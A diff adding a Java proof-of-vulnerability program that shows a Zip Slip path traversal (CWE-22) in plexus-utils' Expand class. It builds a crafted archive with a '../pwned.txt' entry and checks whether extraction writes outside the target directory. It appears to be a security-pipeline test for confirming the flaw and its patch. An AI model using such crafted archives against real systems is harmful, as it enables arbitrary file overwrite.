@@ -1,0 +1,138 @@
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..cf30969
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,132 @@
++import org.codehaus.plexus.util.Expand;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.FileWriter;
++import java.nio.file.Files;
++import java.nio.file.Path;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (Path Traversal / "Zip Slip") in
++ * org.codehaus.plexus.util.Expand.
++ *
++ * Root cause: Expand#extractFile() (Expand.java, around line 153) builds the
++ * on-disk extraction target purely from the attacker-controlled ZipEntry name
++ * via FileUtils.resolveFile(dir, entryName) (FileUtils.java, around line
++ * 1367-1394), with no check that the resolved File stays inside the
++ * destination directory ("dir"). A ZIP entry name such as "../evil.txt"
++ * therefore resolves to a File OUTSIDE the extraction directory, and that
++ * File is subsequently:
++ *   - written to via FileOutputStream(f)      (Expand.java line 178)
++ *   - used to create parent directories via dirF.mkdirs() (Expand.java line 164)
++ *   - used to mkdirs() the entry itself for directory entries (Expand.java line 169)
++ *   - stamped with setLastModified()          (Expand.java line 204)
++ *
++ * This POV exercises the write sink (line 178) which is the clearest,
++ * deterministic evidence of the traversal: it plants a file one directory
++ * above the intended extraction root using a crafted zip and the public
++ * Expand API (setSrc/setDest/execute()), exactly as a real caller
++ * (e.g. an unarchiving task) would invoke it.
++ *
++ * Exit code contract:
++ *   - exit 0  -> traversal succeeded, file escaped the destination directory
++ *                (vulnerable behavior reproduced)
++ *   - exit 1  -> traversal was blocked / file did not escape (patched behavior)
++ */
++public class ZipSlipPov
++{
++    public static void main( String[] args )
++        throws Exception
++    {
++        Path root = Files.createTempDirectory( "zipslip-pov" );
++        Path destDir = root.resolve( "dest" );
++        Files.createDirectories( destDir );
++
++        // The attacker-controlled zip entry escapes "dest" by one level,
++        // landing directly in "root" (the parent of the extraction dir).
++        String maliciousEntryName = "../pwned.txt";
++        String marker = "PWNED-BY-ZIPSLIP-" + System.identityHashCode( root );
++
++        Path zipFile = root.resolve( "evil.zip" );
++        try ( ZipOutputStream zos = new ZipOutputStream( new FileOutputStream( zipFile.toFile() ) ) )
++        {
++            ZipEntry entry = new ZipEntry( maliciousEntryName );
++            zos.putNextEntry( entry );
++            zos.write( marker.getBytes( "UTF-8" ) );
++            zos.closeEntry();
++
++            // A benign entry too, so the archive looks like a normal payload.
++            ZipEntry benign = new ZipEntry( "readme.txt" );
++            zos.putNextEntry( benign );
++            zos.write( "hello".getBytes( "UTF-8" ) );
++            zos.closeEntry();
++        }
++
++        File expectedEscapeTarget = root.resolve( "pwned.txt" ).toFile();
++        // Make sure nothing pre-existing could confuse the check.
++        if ( expectedEscapeTarget.exists() )
++        {
++            expectedEscapeTarget.delete();
++        }
++
++        Expand expand = new Expand();
++        expand.setSrc( zipFile.toFile() );
++        expand.setDest( destDir.toFile() );
++
++        boolean threw = false;
++        try
++        {
++            expand.execute();
++        }
++        catch ( Exception e )
++        {
++            // A patched implementation may reject the traversal by throwing.
++            threw = true;
++            System.out.println( "Expand.execute() threw: " + e );
++        }
++
++        boolean escaped = expectedEscapeTarget.exists()
++            && marker.equals( readFile( expectedEscapeTarget ) );
++
++        // Cleanup best-effort.
++        deleteRecursive( root.toFile() );
++
++        if ( escaped )
++        {
++            System.out.println( "VULNERABLE: zip entry '" + maliciousEntryName
++                + "' escaped destination directory '" + destDir
++                + "' and wrote a file at '" + expectedEscapeTarget + "' (outside dest)." );
++            System.exit( 0 );
++        }
++        else
++        {
++            System.out.println( "SAFE: path traversal was blocked (threw=" + threw
++                + "), no file was written outside the destination directory." );
++            System.exit( 1 );
++        }
++    }
++
++    private static String readFile( File f )
++        throws Exception
++    {
++        return new String( Files.readAllBytes( f.toPath() ), "UTF-8" );
++    }
++
++    private static void deleteRecursive( File f )
++    {
++        if ( f.isDirectory() )
++        {
++            File[] children = f.listFiles();
++            if ( children != null )
++            {
++                for ( File c : children )
++                {
++                    deleteRecursive( c );
++                }
++            }
++        }
++        f.delete();
++    }
++}
